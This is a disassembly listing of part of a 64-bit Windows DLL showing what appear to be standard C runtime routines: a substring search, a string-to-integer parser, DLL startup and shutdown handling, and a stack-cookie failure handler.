   180005e40:	0f be c2             	movsbl %dl,%eax
   180005e43:	66 0f 3a 20 c0 0f    	pinsrb $0xf,%eax,%xmm0
   180005e49:	84 d2                	test   %dl,%dl
   180005e4b:	74 05                	je     0x180005e52
   180005e4d:	48 ff c1             	inc    %rcx
   180005e50:	8a 11                	mov    (%rcx),%dl
   180005e52:	49 ff c9             	dec    %r9
   180005e55:	75 e4                	jne    0x180005e3b
   180005e57:	49 8b c0             	mov    %r8,%rax
   180005e5a:	49 23 c2             	and    %r10,%rax
   180005e5d:	49 3b c3             	cmp    %r11,%rax
   180005e60:	77 5a                	ja     0x180005ebc
   180005e62:	f3 41 0f 6f 08       	movdqu (%r8),%xmm1
   180005e67:	66 0f 3a 63 c1 0c    	pcmpistri $0xc,%xmm1,%xmm0
   180005e6d:	76 06                	jbe    0x180005e75
   180005e6f:	49 83 c0 10          	add    $0x10,%r8
   180005e73:	eb e2                	jmp    0x180005e57
   180005e75:	73 6d                	jae    0x180005ee4
   180005e77:	66 0f 3a 63 c1 0c    	pcmpistri $0xc,%xmm1,%xmm0
   180005e7d:	48 63 c1             	movslq %ecx,%rax
   180005e80:	4c 03 c0             	add    %rax,%r8
   180005e83:	49 8b d0             	mov    %r8,%rdx
   180005e86:	4c 8b cb             	mov    %rbx,%r9
   180005e89:	48 8b c2             	mov    %rdx,%rax
   180005e8c:	49 23 c2             	and    %r10,%rax
   180005e8f:	49 3b c3             	cmp    %r11,%rax
   180005e92:	77 38                	ja     0x180005ecc
   180005e94:	49 8b c1             	mov    %r9,%rax
   180005e97:	49 23 c2             	and    %r10,%rax
   180005e9a:	49 3b c3             	cmp    %r11,%rax
   180005e9d:	77 2d                	ja     0x180005ecc
   180005e9f:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   180005ea3:	f3 41 0f 6f 11       	movdqu (%r9),%xmm2
   180005ea8:	66 0f 3a 63 d1 0c    	pcmpistri $0xc,%xmm1,%xmm2
   180005eae:	71 17                	jno    0x180005ec7
   180005eb0:	78 2d                	js     0x180005edf
   180005eb2:	48 83 c2 10          	add    $0x10,%rdx
   180005eb6:	49 83 c1 10          	add    $0x10,%r9
   180005eba:	eb cd                	jmp    0x180005e89
   180005ebc:	41 80 38 00          	cmpb   $0x0,(%r8)
   180005ec0:	74 22                	je     0x180005ee4
   180005ec2:	41 38 38             	cmp    %dil,(%r8)
   180005ec5:	74 bc                	je     0x180005e83
   180005ec7:	49 ff c0             	inc    %r8
   180005eca:	eb 8b                	jmp    0x180005e57
   180005ecc:	41 8a 01             	mov    (%r9),%al
   180005ecf:	84 c0                	test   %al,%al
   180005ed1:	74 0c                	je     0x180005edf
   180005ed3:	38 02                	cmp    %al,(%rdx)
   180005ed5:	75 f0                	jne    0x180005ec7
   180005ed7:	48 ff c2             	inc    %rdx
   180005eda:	49 ff c1             	inc    %r9
   180005edd:	eb aa                	jmp    0x180005e89
   180005edf:	49 8b c0             	mov    %r8,%rax
   180005ee2:	eb 02                	jmp    0x180005ee6
   180005ee4:	33 c0                	xor    %eax,%eax
   180005ee6:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180005eeb:	48 83 c4 10          	add    $0x10,%rsp
   180005eef:	5f                   	pop    %rdi
   180005ef0:	c3                   	ret
   180005ef1:	cc                   	int3
   180005ef2:	cc                   	int3
   180005ef3:	cc                   	int3
   180005ef4:	40 53                	rex push %rbx
   180005ef6:	48 83 ec 20          	sub    $0x20,%rsp
   180005efa:	48 8b d9             	mov    %rcx,%rbx
   180005efd:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   180005f01:	48 85 d2             	test   %rdx,%rdx
   180005f04:	0f 85 82 00 00 00    	jne    0x180005f8c
   180005f0a:	e8 b1 2e 00 00       	call   0x180008dc0
   180005f0f:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180005f13:	48 8b 90 c0 00 00 00 	mov    0xc0(%rax),%rdx
   180005f1a:	48 89 13             	mov    %rdx,(%rbx)
   180005f1d:	48 8b 88 b8 00 00 00 	mov    0xb8(%rax),%rcx
   180005f24:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   180005f28:	48 3b 15 d1 3a 01 00 	cmp    0x13ad1(%rip),%rdx        # 0x180019a00
   180005f2f:	74 16                	je     0x180005f47
   180005f31:	8b 80 c8 00 00 00    	mov    0xc8(%rax),%eax
   180005f37:	85 05 3b 3c 01 00    	test   %eax,0x13c3b(%rip)        # 0x180019b78
   180005f3d:	75 08                	jne    0x180005f47
   180005f3f:	e8 88 22 00 00       	call   0x1800081cc
   180005f44:	48 89 03             	mov    %rax,(%rbx)
   180005f47:	48 8b 05 d2 37 01 00 	mov    0x137d2(%rip),%rax        # 0x180019720
   180005f4e:	48 39 43 08          	cmp    %rax,0x8(%rbx)
   180005f52:	74 1b                	je     0x180005f6f
   180005f54:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180005f58:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   180005f5e:	85 0d 14 3c 01 00    	test   %ecx,0x13c14(%rip)        # 0x180019b78
   180005f64:	75 09                	jne    0x180005f6f
   180005f66:	e8 59 26 00 00       	call   0x1800085c4
   180005f6b:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180005f6f:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180005f73:	8b 81 c8 00 00 00    	mov    0xc8(%rcx),%eax
   180005f79:	a8 02                	test   $0x2,%al
   180005f7b:	75 16                	jne    0x180005f93
   180005f7d:	83 c8 02             	or     $0x2,%eax
   180005f80:	89 81 c8 00 00 00    	mov    %eax,0xc8(%rcx)
   180005f86:	c6 43 18 01          	movb   $0x1,0x18(%rbx)
   180005f8a:	eb 07                	jmp    0x180005f93
   180005f8c:	0f 10 02             	movups (%rdx),%xmm0
   180005f8f:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   180005f93:	48 8b c3             	mov    %rbx,%rax
   180005f96:	48 83 c4 20          	add    $0x20,%rsp
   180005f9a:	5b                   	pop    %rbx
   180005f9b:	c3                   	ret
   180005f9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005fa1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180005fa6:	56                   	push   %rsi
   180005fa7:	57                   	push   %rdi
   180005fa8:	41 54                	push   %r12
   180005faa:	41 56                	push   %r14
   180005fac:	41 57                	push   %r15
   180005fae:	48 83 ec 40          	sub    $0x40,%rsp
   180005fb2:	4c 8b e2             	mov    %rdx,%r12
   180005fb5:	48 8b d1             	mov    %rcx,%rdx
   180005fb8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180005fbd:	45 8b f1             	mov    %r9d,%r14d
   180005fc0:	4d 8b f8             	mov    %r8,%r15
   180005fc3:	e8 2c ff ff ff       	call   0x180005ef4
   180005fc8:	4d 85 ff             	test   %r15,%r15
   180005fcb:	74 03                	je     0x180005fd0
   180005fcd:	4d 89 27             	mov    %r12,(%r15)
   180005fd0:	4d 85 e4             	test   %r12,%r12
   180005fd3:	74 0e                	je     0x180005fe3
   180005fd5:	45 85 f6             	test   %r14d,%r14d
   180005fd8:	74 1e                	je     0x180005ff8
   180005fda:	41 8d 46 fe          	lea    -0x2(%r14),%eax
   180005fde:	83 f8 22             	cmp    $0x22,%eax
   180005fe1:	76 15                	jbe    0x180005ff8
   180005fe3:	e8 48 16 00 00       	call   0x180007630
   180005fe8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180005fee:	e8 71 15 00 00       	call   0x180007564
   180005ff3:	e9 86 00 00 00       	jmp    0x18000607e
   180005ff8:	41 8a 34 24          	mov    (%r12),%sil
   180005ffc:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   180006001:	33 ff                	xor    %edi,%edi
   180006003:	49 8d 5c 24 01       	lea    0x1(%r12),%rbx
   180006008:	41 83 b8 d4 00 00 00 	cmpl   $0x1,0xd4(%r8)
   18000600f:	01 
   180006010:	7e 1a                	jle    0x18000602c
   180006012:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180006017:	40 0f b6 ce          	movzbl %sil,%ecx
   18000601b:	ba 08 00 00 00       	mov    $0x8,%edx
   180006020:	e8 4f 2b 00 00       	call   0x180008b74
   180006025:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   18000602a:	eb 12                	jmp    0x18000603e
   18000602c:	49 8b 80 08 01 00 00 	mov    0x108(%r8),%rax
   180006033:	40 0f b6 ce          	movzbl %sil,%ecx
   180006037:	0f b7 04 48          	movzwl (%rax,%rcx,2),%eax
   18000603b:	83 e0 08             	and    $0x8,%eax
   18000603e:	85 c0                	test   %eax,%eax
   180006040:	74 08                	je     0x18000604a
   180006042:	40 8a 33             	mov    (%rbx),%sil
   180006045:	48 ff c3             	inc    %rbx
   180006048:	eb be                	jmp    0x180006008
   18000604a:	8b ac 24 90 00 00 00 	mov    0x90(%rsp),%ebp
   180006051:	40 80 fe 2d          	cmp    $0x2d,%sil
   180006055:	75 05                	jne    0x18000605c
   180006057:	83 cd 02             	or     $0x2,%ebp
   18000605a:	eb 06                	jmp    0x180006062
   18000605c:	40 80 fe 2b          	cmp    $0x2b,%sil
   180006060:	75 06                	jne    0x180006068
   180006062:	40 8a 33             	mov    (%rbx),%sil
   180006065:	48 ff c3             	inc    %rbx
   180006068:	45 85 f6             	test   %r14d,%r14d
   18000606b:	74 1d                	je     0x18000608a
   18000606d:	41 8d 46 fe          	lea    -0x2(%r14),%eax
   180006071:	83 f8 22             	cmp    $0x22,%eax
   180006074:	76 0f                	jbe    0x180006085
   180006076:	4d 85 ff             	test   %r15,%r15
   180006079:	74 03                	je     0x18000607e
   18000607b:	4d 89 27             	mov    %r12,(%r15)
   18000607e:	33 ff                	xor    %edi,%edi
   180006080:	e9 25 01 00 00       	jmp    0x1800061aa
   180006085:	45 85 f6             	test   %r14d,%r14d
   180006088:	75 26                	jne    0x1800060b0
   18000608a:	40 80 fe 30          	cmp    $0x30,%sil
   18000608e:	74 08                	je     0x180006098
   180006090:	41 be 0a 00 00 00    	mov    $0xa,%r14d
   180006096:	eb 34                	jmp    0x1800060cc
   180006098:	8a 03                	mov    (%rbx),%al
   18000609a:	2c 58                	sub    $0x58,%al
   18000609c:	a8 df                	test   $0xdf,%al
   18000609e:	74 08                	je     0x1800060a8
   1800060a0:	41 be 08 00 00 00    	mov    $0x8,%r14d
   1800060a6:	eb 24                	jmp    0x1800060cc
   1800060a8:	41 be 10 00 00 00    	mov    $0x10,%r14d
   1800060ae:	eb 0c                	jmp    0x1800060bc
   1800060b0:	41 83 fe 10          	cmp    $0x10,%r14d
   1800060b4:	75 16                	jne    0x1800060cc
   1800060b6:	40 80 fe 30          	cmp    $0x30,%sil
   1800060ba:	75 10                	jne    0x1800060cc
   1800060bc:	8a 03                	mov    (%rbx),%al
   1800060be:	2c 58                	sub    $0x58,%al
   1800060c0:	a8 df                	test   $0xdf,%al
   1800060c2:	75 08                	jne    0x1800060cc
   1800060c4:	40 8a 73 01          	mov    0x1(%rbx),%sil
   1800060c8:	48 83 c3 02          	add    $0x2,%rbx
   1800060cc:	4d 8b 90 08 01 00 00 	mov    0x108(%r8),%r10
   1800060d3:	33 d2                	xor    %edx,%edx
   1800060d5:	83 c8 ff             	or     $0xffffffff,%eax
   1800060d8:	41 f7 f6             	div    %r14d
   1800060db:	44 8b c8             	mov    %eax,%r9d
   1800060de:	40 0f b6 ce          	movzbl %sil,%ecx
   1800060e2:	45 0f b7 04 4a       	movzwl (%r10,%rcx,2),%r8d
   1800060e7:	41 8b c8             	mov    %r8d,%ecx
   1800060ea:	83 e1 04             	and    $0x4,%ecx
   1800060ed:	74 09                	je     0x1800060f8
   1800060ef:	40 0f be ce          	movsbl %sil,%ecx
   1800060f3:	83 e9 30             	sub    $0x30,%ecx
   1800060f6:	eb 1a                	jmp    0x180006112
   1800060f8:	41 81 e0 03 01 00 00 	and    $0x103,%r8d
   1800060ff:	74 2c                	je     0x18000612d
   180006101:	8d 46 9f             	lea    -0x61(%rsi),%eax
   180006104:	40 0f be ce          	movsbl %sil,%ecx
   180006108:	3c 19                	cmp    $0x19,%al
   18000610a:	77 03                	ja     0x18000610f
   18000610c:	83 e9 20             	sub    $0x20,%ecx
   18000610f:	83 c1 c9             	add    $0xffffffc9,%ecx
   180006112:	41 3b ce             	cmp    %r14d,%ecx
   180006115:	73 16                	jae    0x18000612d
   180006117:	83 cd 08             	or     $0x8,%ebp
   18000611a:	41 3b f9             	cmp    %r9d,%edi
   18000611d:	72 22                	jb     0x180006141
   18000611f:	75 04                	jne    0x180006125
   180006121:	3b ca                	cmp    %edx,%ecx
   180006123:	76 1c                	jbe    0x180006141
   180006125:	83 cd 04             	or     $0x4,%ebp
   180006128:	4d 85 ff             	test   %r15,%r15
   18000612b:	75 1a                	jne    0x180006147
   18000612d:	48 ff cb             	dec    %rbx
   180006130:	40 f6 c5 08          	test   $0x8,%bpl
   180006134:	75 19                	jne    0x18000614f
   180006136:	4d 85 ff             	test   %r15,%r15
   180006139:	49 0f 45 dc          	cmovne %r12,%rbx
   18000613d:	33 ff                	xor    %edi,%edi
   18000613f:	eb 59                	jmp    0x18000619a
   180006141:	41 0f af fe          	imul   %r14d,%edi
   180006145:	03 f9                	add    %ecx,%edi
   180006147:	40 8a 33             	mov    (%rbx),%sil
   18000614a:	48 ff c3             	inc    %rbx
   18000614d:	eb 8f                	jmp    0x1800060de
   18000614f:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
   180006154:	40 f6 c5 04          	test   $0x4,%bpl
   180006158:	75 1d                	jne    0x180006177
   18000615a:	40 f6 c5 01          	test   $0x1,%bpl
   18000615e:	75 3a                	jne    0x18000619a
   180006160:	8b c5                	mov    %ebp,%eax
   180006162:	83 e0 02             	and    $0x2,%eax
   180006165:	74 08                	je     0x18000616f
   180006167:	81 ff 00 00 00 80    	cmp    $0x80000000,%edi
   18000616d:	77 08                	ja     0x180006177
   18000616f:	85 c0                	test   %eax,%eax
   180006171:	75 27                	jne    0x18000619a
   180006173:	3b fe                	cmp    %esi,%edi
   180006175:	76 23                	jbe    0x18000619a
   180006177:	e8 b4 14 00 00       	call   0x180007630
   18000617c:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   180006182:	40 f6 c5 01          	test   $0x1,%bpl
   180006186:	74 05                	je     0x18000618d
   180006188:	83 cf ff             	or     $0xffffffff,%edi
   18000618b:	eb 0d                	jmp    0x18000619a
   18000618d:	40 8a c5             	mov    %bpl,%al
   180006190:	24 02                	and    $0x2,%al
   180006192:	f6 d8                	neg    %al
   180006194:	1b ff                	sbb    %edi,%edi
   180006196:	f7 df                	neg    %edi
   180006198:	03 fe                	add    %esi,%edi
   18000619a:	4d 85 ff             	test   %r15,%r15
   18000619d:	74 03                	je     0x1800061a2
   18000619f:	49 89 1f             	mov    %rbx,(%r15)
   1800061a2:	40 f6 c5 02          	test   $0x2,%bpl
   1800061a6:	74 02                	je     0x1800061aa
   1800061a8:	f7 df                	neg    %edi
   1800061aa:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1800061af:	74 0c                	je     0x1800061bd
   1800061b1:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1800061b6:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   1800061bd:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1800061c2:	8b c7                	mov    %edi,%eax
   1800061c4:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1800061c8:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   1800061cc:	49 8b e3             	mov    %r11,%rsp
   1800061cf:	41 5f                	pop    %r15
   1800061d1:	41 5e                	pop    %r14
   1800061d3:	41 5c                	pop    %r12
   1800061d5:	5f                   	pop    %rdi
   1800061d6:	5e                   	pop    %rsi
   1800061d7:	c3                   	ret
   1800061d8:	48 83 ec 38          	sub    $0x38,%rsp
   1800061dc:	33 c0                	xor    %eax,%eax
   1800061de:	45 8b c8             	mov    %r8d,%r9d
   1800061e1:	4c 8b c2             	mov    %rdx,%r8
   1800061e4:	39 05 8a 52 01 00    	cmp    %eax,0x1528a(%rip)        # 0x18001b474
   1800061ea:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800061ee:	48 8b d1             	mov    %rcx,%rdx
   1800061f1:	75 09                	jne    0x1800061fc
   1800061f3:	48 8d 0d 6e 39 01 00 	lea    0x1396e(%rip),%rcx        # 0x180019b68
   1800061fa:	eb 02                	jmp    0x1800061fe
   1800061fc:	33 c9                	xor    %ecx,%ecx
   1800061fe:	e8 99 fd ff ff       	call   0x180005f9c
   180006203:	48 83 c4 38          	add    $0x38,%rsp
   180006207:	c3                   	ret
   180006208:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000620d:	53                   	push   %rbx
   18000620e:	48 83 ec 20          	sub    $0x20,%rsp
   180006212:	49 8b d8             	mov    %r8,%rbx
   180006215:	83 fa 01             	cmp    $0x1,%edx
   180006218:	75 7d                	jne    0x180006297
   18000621a:	e8 81 14 00 00       	call   0x1800076a0
   18000621f:	85 c0                	test   %eax,%eax
   180006221:	75 07                	jne    0x18000622a
   180006223:	33 c0                	xor    %eax,%eax
   180006225:	e9 37 01 00 00       	jmp    0x180006361
   18000622a:	e8 fd 2c 00 00       	call   0x180008f2c
   18000622f:	85 c0                	test   %eax,%eax
   180006231:	75 07                	jne    0x18000623a
   180006233:	e8 88 14 00 00       	call   0x1800076c0
   180006238:	eb e9                	jmp    0x180006223
   18000623a:	e8 85 40 00 00       	call   0x18000a2c4
   18000623f:	ff 15 4b ae 00 00    	call   *0xae4b(%rip)        # 0x180011090
   180006245:	48 89 05 84 69 01 00 	mov    %rax,0x16984(%rip)        # 0x18001cbd0
   18000624c:	e8 ef 37 00 00       	call   0x180009a40
   180006251:	48 89 05 b0 45 01 00 	mov    %rax,0x145b0(%rip)        # 0x18001a808
   180006258:	e8 9b 2f 00 00       	call   0x1800091f8
   18000625d:	85 c0                	test   %eax,%eax
   18000625f:	79 07                	jns    0x180006268
   180006261:	e8 46 2d 00 00       	call   0x180008fac
   180006266:	eb cb                	jmp    0x180006233
   180006268:	e8 2f 33 00 00       	call   0x18000959c
   18000626d:	85 c0                	test   %eax,%eax
   18000626f:	78 1f                	js     0x180006290
   180006271:	e8 e2 35 00 00       	call   0x180009858
   180006276:	85 c0                	test   %eax,%eax
   180006278:	78 16                	js     0x180006290
   18000627a:	33 c9                	xor    %ecx,%ecx
   18000627c:	e8 63 16 00 00       	call   0x1800078e4
   180006281:	85 c0                	test   %eax,%eax
   180006283:	75 0b                	jne    0x180006290
   180006285:	ff 05 75 45 01 00    	incl   0x14575(%rip)        # 0x18001a800
   18000628b:	e9 cc 00 00 00       	jmp    0x18000635c
   180006290:	e8 93 32 00 00       	call   0x180009528
   180006295:	eb ca                	jmp    0x180006261
   180006297:	85 d2                	test   %edx,%edx
   180006299:	75 52                	jne    0x1800062ed
   18000629b:	8b 05 5f 45 01 00    	mov    0x1455f(%rip),%eax        # 0x18001a800
   1800062a1:	85 c0                	test   %eax,%eax
   1800062a3:	0f 8e 7a ff ff ff    	jle    0x180006223
   1800062a9:	ff c8                	dec    %eax
   1800062ab:	89 05 4f 45 01 00    	mov    %eax,0x1454f(%rip)        # 0x18001a800
   1800062b1:	39 15 39 4b 01 00    	cmp    %edx,0x14b39(%rip)        # 0x18001adf0
   1800062b7:	75 05                	jne    0x1800062be
   1800062b9:	e8 16 16 00 00       	call   0x1800078d4
   1800062be:	e8 a1 14 00 00       	call   0x180007764
   1800062c3:	48 85 db             	test   %rbx,%rbx
   1800062c6:	75 10                	jne    0x1800062d8
   1800062c8:	e8 5b 32 00 00       	call   0x180009528
   1800062cd:	e8 da 2c 00 00       	call   0x180008fac
   1800062d2:	e8 e9 13 00 00       	call   0x1800076c0
   1800062d7:	90                   	nop
   1800062d8:	48 85 db             	test   %rbx,%rbx
   1800062db:	75 7f                	jne    0x18000635c
   1800062dd:	83 3d 44 34 01 00 ff 	cmpl   $0xffffffff,0x13444(%rip)        # 0x180019728
   1800062e4:	74 76                	je     0x18000635c
   1800062e6:	e8 c1 2c 00 00       	call   0x180008fac
   1800062eb:	eb 6f                	jmp    0x18000635c
   1800062ed:	83 fa 02             	cmp    $0x2,%edx
   1800062f0:	75 5e                	jne    0x180006350
   1800062f2:	8b 0d 30 34 01 00    	mov    0x13430(%rip),%ecx        # 0x180019728
   1800062f8:	e8 53 39 00 00       	call   0x180009c50
   1800062fd:	48 85 c0             	test   %rax,%rax
   180006300:	75 5a                	jne    0x18000635c
   180006302:	ba 78 04 00 00       	mov    $0x478,%edx
   180006307:	8d 48 01             	lea    0x1(%rax),%ecx
   18000630a:	e8 35 3e 00 00       	call   0x18000a144
   18000630f:	48 8b d8             	mov    %rax,%rbx
   180006312:	48 85 c0             	test   %rax,%rax
   180006315:	0f 84 08 ff ff ff    	je     0x180006223
   18000631b:	48 8b d0             	mov    %rax,%rdx
   18000631e:	8b 0d 04 34 01 00    	mov    0x13404(%rip),%ecx        # 0x180019728
   180006324:	e8 43 39 00 00       	call   0x180009c6c
   180006329:	48 8b cb             	mov    %rbx,%rcx
   18000632c:	85 c0                	test   %eax,%eax
   18000632e:	74 16                	je     0x180006346
   180006330:	33 d2                	xor    %edx,%edx
   180006332:	e8 31 2b 00 00       	call   0x180008e68
   180006337:	ff 15 5b ad 00 00    	call   *0xad5b(%rip)        # 0x180011098
   18000633d:	89 03                	mov    %eax,(%rbx)
   18000633f:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   180006344:	eb 16                	jmp    0x18000635c
   180006346:	e8 35 f2 ff ff       	call   0x180005580
   18000634b:	e9 d3 fe ff ff       	jmp    0x180006223
   180006350:	83 fa 03             	cmp    $0x3,%edx
   180006353:	75 07                	jne    0x18000635c
   180006355:	33 c9                	xor    %ecx,%ecx
   180006357:	e8 28 2a 00 00       	call   0x180008d84
   18000635c:	b8 01 00 00 00       	mov    $0x1,%eax
   180006361:	48 83 c4 20          	add    $0x20,%rsp
   180006365:	5b                   	pop    %rbx
   180006366:	c3                   	ret
   180006367:	cc                   	int3
   180006368:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000636d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180006372:	57                   	push   %rdi
   180006373:	48 83 ec 20          	sub    $0x20,%rsp
   180006377:	49 8b f8             	mov    %r8,%rdi
   18000637a:	8b da                	mov    %edx,%ebx
   18000637c:	48 8b f1             	mov    %rcx,%rsi
   18000637f:	83 fa 01             	cmp    $0x1,%edx
   180006382:	75 05                	jne    0x180006389
   180006384:	e8 03 36 00 00       	call   0x18000998c
   180006389:	4c 8b c7             	mov    %rdi,%r8
   18000638c:	8b d3                	mov    %ebx,%edx
   18000638e:	48 8b ce             	mov    %rsi,%rcx
   180006391:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180006396:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000639b:	48 83 c4 20          	add    $0x20,%rsp
   18000639f:	5f                   	pop    %rdi
   1800063a0:	e9 03 00 00 00       	jmp    0x1800063a8
   1800063a5:	cc                   	int3
   1800063a6:	cc                   	int3
   1800063a7:	cc                   	int3
   1800063a8:	48 8b c4             	mov    %rsp,%rax
   1800063ab:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1800063af:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1800063b3:	89 50 10             	mov    %edx,0x10(%rax)
   1800063b6:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800063ba:	56                   	push   %rsi
   1800063bb:	57                   	push   %rdi
   1800063bc:	41 56                	push   %r14
   1800063be:	48 83 ec 50          	sub    $0x50,%rsp
   1800063c2:	49 8b f0             	mov    %r8,%rsi
   1800063c5:	8b da                	mov    %edx,%ebx
   1800063c7:	4c 8b f1             	mov    %rcx,%r14
   1800063ca:	ba 01 00 00 00       	mov    $0x1,%edx
   1800063cf:	89 50 b8             	mov    %edx,-0x48(%rax)
   1800063d2:	85 db                	test   %ebx,%ebx
   1800063d4:	75 0f                	jne    0x1800063e5
   1800063d6:	39 1d 24 44 01 00    	cmp    %ebx,0x14424(%rip)        # 0x18001a800
   1800063dc:	75 07                	jne    0x1800063e5
   1800063de:	33 c0                	xor    %eax,%eax
   1800063e0:	e9 d2 00 00 00       	jmp    0x1800064b7
   1800063e5:	8d 43 ff             	lea    -0x1(%rbx),%eax
   1800063e8:	83 f8 01             	cmp    $0x1,%eax
   1800063eb:	77 38                	ja     0x180006425
   1800063ed:	48 8b 05 ec b3 00 00 	mov    0xb3ec(%rip),%rax        # 0x1800117e0
   1800063f4:	48 85 c0             	test   %rax,%rax
   1800063f7:	74 0a                	je     0x180006403
   1800063f9:	8b d3                	mov    %ebx,%edx
   1800063fb:	ff d0                	call   *%rax
   1800063fd:	8b d0                	mov    %eax,%edx
   1800063ff:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180006403:	85 d2                	test   %edx,%edx
   180006405:	74 17                	je     0x18000641e
   180006407:	4c 8b c6             	mov    %rsi,%r8
   18000640a:	8b d3                	mov    %ebx,%edx
   18000640c:	49 8b ce             	mov    %r14,%rcx
   18000640f:	e8 f4 fd ff ff       	call   0x180006208
   180006414:	8b d0                	mov    %eax,%edx
   180006416:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000641a:	85 c0                	test   %eax,%eax
   18000641c:	75 07                	jne    0x180006425
   18000641e:	33 c0                	xor    %eax,%eax
   180006420:	e9 92 00 00 00       	jmp    0x1800064b7
   180006425:	4c 8b c6             	mov    %rsi,%r8
   180006428:	8b d3                	mov    %ebx,%edx
   18000642a:	49 8b ce             	mov    %r14,%rcx
   18000642d:	e8 06 36 00 00       	call   0x180009a38
   180006432:	8b f8                	mov    %eax,%edi
   180006434:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180006438:	83 fb 01             	cmp    $0x1,%ebx
   18000643b:	75 34                	jne    0x180006471
   18000643d:	85 c0                	test   %eax,%eax
   18000643f:	75 30                	jne    0x180006471
   180006441:	4c 8b c6             	mov    %rsi,%r8
   180006444:	33 d2                	xor    %edx,%edx
   180006446:	49 8b ce             	mov    %r14,%rcx
   180006449:	e8 ea 35 00 00       	call   0x180009a38
   18000644e:	4c 8b c6             	mov    %rsi,%r8
   180006451:	33 d2                	xor    %edx,%edx
   180006453:	49 8b ce             	mov    %r14,%rcx
   180006456:	e8 ad fd ff ff       	call   0x180006208
   18000645b:	48 8b 05 7e b3 00 00 	mov    0xb37e(%rip),%rax        # 0x1800117e0
   180006462:	48 85 c0             	test   %rax,%rax
   180006465:	74 0a                	je     0x180006471
   180006467:	4c 8b c6             	mov    %rsi,%r8
   18000646a:	33 d2                	xor    %edx,%edx
   18000646c:	49 8b ce             	mov    %r14,%rcx
   18000646f:	ff d0                	call   *%rax
   180006471:	85 db                	test   %ebx,%ebx
   180006473:	74 05                	je     0x18000647a
   180006475:	83 fb 03             	cmp    $0x3,%ebx
   180006478:	75 37                	jne    0x1800064b1
   18000647a:	4c 8b c6             	mov    %rsi,%r8
   18000647d:	8b d3                	mov    %ebx,%edx
   18000647f:	49 8b ce             	mov    %r14,%rcx
   180006482:	e8 81 fd ff ff       	call   0x180006208
   180006487:	f7 d8                	neg    %eax
   180006489:	1b c9                	sbb    %ecx,%ecx
   18000648b:	23 cf                	and    %edi,%ecx
   18000648d:	8b f9                	mov    %ecx,%edi
   18000648f:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   180006493:	74 1c                	je     0x1800064b1
   180006495:	48 8b 05 44 b3 00 00 	mov    0xb344(%rip),%rax        # 0x1800117e0
   18000649c:	48 85 c0             	test   %rax,%rax
   18000649f:	74 10                	je     0x1800064b1
   1800064a1:	4c 8b c6             	mov    %rsi,%r8
   1800064a4:	8b d3                	mov    %ebx,%edx
   1800064a6:	49 8b ce             	mov    %r14,%rcx
   1800064a9:	ff d0                	call   *%rax
   1800064ab:	8b f8                	mov    %eax,%edi
   1800064ad:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800064b1:	8b c7                	mov    %edi,%eax
   1800064b3:	eb 02                	jmp    0x1800064b7
   1800064b5:	33 c0                	xor    %eax,%eax
   1800064b7:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   1800064be:	00 
   1800064bf:	48 83 c4 50          	add    $0x50,%rsp
   1800064c3:	41 5e                	pop    %r14
   1800064c5:	5f                   	pop    %rdi
   1800064c6:	5e                   	pop    %rsi
   1800064c7:	c3                   	ret
   1800064c8:	40 53                	rex push %rbx
   1800064ca:	48 83 ec 20          	sub    $0x20,%rsp
   1800064ce:	48 8b d9             	mov    %rcx,%rbx
   1800064d1:	ff 15 c9 ab 00 00    	call   *0xabc9(%rip)        # 0x1800110a0
   1800064d7:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800064dc:	89 05 ae 48 01 00    	mov    %eax,0x148ae(%rip)        # 0x18001ad90
   1800064e2:	e8 31 40 00 00       	call   0x18000a518
   1800064e7:	48 8b cb             	mov    %rbx,%rcx
   1800064ea:	e8 35 3c 00 00       	call   0x18000a124
   1800064ef:	83 3d 9a 48 01 00 00 	cmpl   $0x0,0x1489a(%rip)        # 0x18001ad90
   1800064f6:	75 0a                	jne    0x180006502
   1800064f8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800064fd:	e8 16 40 00 00       	call   0x18000a518
   180006502:	b9 09 04 00 c0       	mov    $0xc0000409,%ecx
   180006507:	48 83 c4 20          	add    $0x20,%rsp
   18000650b:	5b                   	pop    %rbx
   18000650c:	e9 f3 3b 00 00       	jmp    0x18000a104
   180006511:	cc                   	int3
   180006512:	cc                   	int3
